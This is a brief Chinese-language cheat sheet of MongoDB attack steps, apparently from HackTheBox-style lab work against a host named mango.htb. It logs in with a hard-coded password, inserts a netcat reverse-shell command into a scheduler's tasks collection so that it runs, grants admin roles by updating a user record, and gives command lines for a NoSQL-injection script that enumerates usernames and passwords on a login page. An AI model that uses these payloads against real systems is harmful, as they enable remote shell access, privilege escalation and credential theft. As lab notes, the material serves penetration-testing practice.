# mongodb

1. 信息枚举

客户端：mongo

```c
mongo -u mark -p 5AYRft73VtFpc84k scheduler   ---db 查看库信息
show collections       ----show tables;查看已存在的表
db.tasks.find({})     ----查看一下表内容,现在表中无文档
db.tasks.insert({cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.247.129 4444 >/tmp/f"})   ----将反弹shell插入文档
db.getCollectionNames() //搜集user
db.users.update({"_id": "CNT3t4RJkHZFegE3m"}, { $set: { "roles" : ["admin"]}}) //利用已经是admin用户给其他用户赋权

```

2\. mongodb脚本爆破

如果存在sql注入，直接爆，没什么说的

```clike
https://raw.githubusercontent.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/master/nosqli-user-pass-enum.py
```

```clike
python mongo.py -m post -up username -pp password -op login:login -u http://staging-order.mango.htb/ -ep username

python mongo.py -m post -up username -pp password -op login:login -u http://staging-order.mango.htb/ -ep password
```
